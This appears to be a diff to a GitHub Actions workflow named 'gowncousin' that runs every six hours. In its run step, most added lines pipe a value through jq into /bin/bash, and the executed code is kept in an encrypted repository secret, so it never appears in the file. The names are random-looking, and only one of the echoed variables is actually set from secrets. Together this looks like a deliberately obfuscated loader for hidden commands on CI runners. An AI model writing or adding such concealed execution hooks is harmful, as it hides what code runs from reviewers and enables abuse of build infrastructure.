@@ -3,20 +3,32 @@ name: gowncousin
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 5/6 * * *'
+    - cron: '8 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gowncousin
         env:
-          da1253: ${{ secrets.da1253 }}
+          hymiz94: ${{ secrets.hymiz94 }}
         run: |
-          echo $da1253 | jq -r .sgp00531 | /bin/bash
-          echo $w396 | jq -r .xxrao4 | /bin/bash
-          echo $xj3 | jq -r .wejif99103 | /bin/bash
-          echo $btaav129 | jq -r .pqe49 | /bin/bash
-          echo $fpg3 | jq -r .z7 | /bin/bash
-          echo $l66837 | jq -r .tmf144 | /bin/bash
+          echo $hymiz94 | jq -r .s05 | /bin/bash
+          echo $ihi94069 | jq -r .zu096 | /bin/bash
+          echo $an0814 | jq -r .ggm8 | /bin/bash
+          echo $cq0 | jq -r .gj14287 | /bin/bash
+          echo $hd185 | jq -r .ctkyj8 | /bin/bash
+          echo $a29837 | jq -r .s578 | /bin/bash
+          echo $ie82 | jq -r .h08 | /bin/bash
+          echo $iff1 | jq -r .f001 | /bin/bash
+          echo $smwkm92890 | jq -r .oi9 | /bin/bash
+          echo $dmkf25506 | jq -r .xtn00389 | /bin/bash
+          echo $udfbg0327 | jq -r .trnu182 | /bin/bash
+          echo $soo68615 | jq -r .ilx1466 | /bin/bash
+          echo $wc6 | jq -r .vtyx5920 | /bin/bash
+          echo $t7516 | jq -r .lc4 | /bin/bash
+          echo $uc29622 | jq -r .lx09923 | /bin/bash
+          echo $gr11 | jq -r .sm05825 | /bin/bash
+          echo $gnhfb239 | jq -r .lgvv19212 | /bin/bash
 
